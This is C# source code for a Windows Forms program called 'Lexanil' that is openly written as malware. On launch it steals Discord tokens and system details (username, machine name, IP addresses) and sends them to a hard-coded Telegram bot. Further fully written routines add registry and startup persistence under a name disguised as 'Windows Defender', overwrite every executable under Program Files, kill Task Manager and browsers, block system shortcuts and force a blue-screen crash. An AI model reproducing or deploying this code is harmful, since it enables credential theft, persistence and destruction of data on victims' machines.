using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Net;
using Lexanil;
using System.IO;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Sockets;
using Microsoft.Win32;
using System.Collections.Specialized;

namespace Lexanil
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("user32.dll")]
        static extern int ShowCursor(bool bShow);
        private bool ALT_F4 = false;

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public Keys key;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr extra;
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc callback, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hook, int nCode, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]



        private static extern short GetAsyncKeyState(Keys key); 
        private IntPtr ptrHook;
        private LowLevelKeyboardProc objKeyboardProcess;

        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            broadcastInfection(); 
            //disableShortcuts();
            //ShowCursor(false);
            //startupinfect();
            //infectFiles();
            //prockilltmr.Start();
        }

        static string[] processes = new[] { "iexplore", "steam", "explorer", "Taskmgr", "Procmon", "Procmon64", "cmd", "Discord", "chrome", "firefox" };
        private static bool foundSth;

        private void prockilltmr_Tick(object sender, EventArgs e)
        {
            foreach (Process proc in Process.GetProcesses())
            {

                if (processes.Contains(proc.ProcessName))
                {
                    try
                    {
                        proc.Kill();
                    }
                    catch (Exception) { }

                }
            }
        }

        bool HasAltModifier(int flags)
        {
            return (flags & 0x20) == 0x20;
        }

        private void startupInfect()
        {
            try
            {
                if (File.Exists(Environment.SpecialFolder.ApplicationData + "\\.lxnl"))
                {
                    var curfilename = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;

                    File.Copy(curfilename, Environment.SpecialFolder.Startup + "\\csrss.exe");
                    var rWrite = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                    rWrite.SetValue("Windows Defender",
                                      AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName);
                }
                else if (!Directory.Exists(Environment.SpecialFolder.ApplicationData + "\\.lxnl"))
                {
                    File.Create(Environment.SpecialFolder.ApplicationData + "\\.lxnl").Close();
                    File.WriteAllText(Environment.SpecialFolder.ApplicationData + "\\.lxnl", System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes($"Hello {Environment.UserName} Your PC has been infected by Lexanil, a new type of malware which has already stolen your data and published on the internet, good luck and thanks for the data!")));
                    broadcastInfection();
                    bsod();
                }

            }
            catch (Exception)
            {

            }
        }

        private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
        {
            if (nCode >= 0)
            {
                KBDLLHOOKSTRUCT objKeyInfo = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lp, typeof(KBDLLHOOKSTRUCT));


                if (objKeyInfo.key == Keys.RWin || objKeyInfo.key == Keys.LWin || objKeyInfo.key == Keys.Tab && HasAltModifier(objKeyInfo.flags) || objKeyInfo.key == Keys.Escape && (ModifierKeys & Keys.Control) == Keys.Control)
                {
                    return (IntPtr)1;
                }
            }
            return CallNextHookEx(ptrHook, nCode, wp, lp);
        }

        private void bsod()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }

        private void infectFiles()
        {
            var path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            var curfilename = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
            try
            {
                foreach (string file in Directory.GetFiles(path, "*.exe", SearchOption.AllDirectories))
                {
                    File.Copy(curfilename, file, true);
                }
            }
            catch (Exception)
            {

            }


        }

        private void disableShortcuts() 
        {
            ProcessModule objCurrentModule = Process.GetCurrentProcess().MainModule;
            objKeyboardProcess = new LowLevelKeyboardProc(captureKey);
            ptrHook = SetWindowsHookEx(13, objKeyboardProcess, GetModuleHandle(objCurrentModule.ModuleName), 0);
        }

        private string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return null;
        }

        private string GetPublicIPAddress() 
        {
            string ip = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return ip;
        }

        private void broadcastInfection()
        {
            string url = $"https://api.telegram.org/bot1991257214:AAHecknMxCKd24uX8wNC5g5AYahRLlUSCVs/sendMessage?chat_id=1466869929&text=" +
                $"😈 {AppDomain.CurrentDomain.FriendlyName}(Lexil™) Has infected Someone, I'm sending you his details! 😈\n" +
                $"User Name: {Environment.UserName}\n" +
                $"Machine Name: {Environment.MachineName}\n" +
                $"LocalIP: {GetLocalIPAddress()}\n" +
                $"PublicIP: {GetPublicIPAddress()}\n" +
                $"Discord Tokens: {string.Join("\n", scrapeDiscordTokens())}";

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream resStream = response.GetResponseStream();
        }

        public static List<string> scrapeDiscordTokens()
        {
            List<string> discordtokens = new List<string>();
            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");

            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string readedfile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    discordtokens.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                    discordtokens.Add(match.Value + "\n");
            }


            discordtokens = discordtokens.ToList();

            Console.WriteLine(discordtokens);

            if (discordtokens.Count > 0)
            {
                foundSth = true;
            }
            else
                discordtokens.Add("Empty");

            return discordtokens;
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            ALT_F4 = (e.KeyCode.Equals(Keys.F4) && e.Alt == true); 
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (ALT_F4)
            {
                e.Cancel = true;
                return;
            }

        }
    }


}

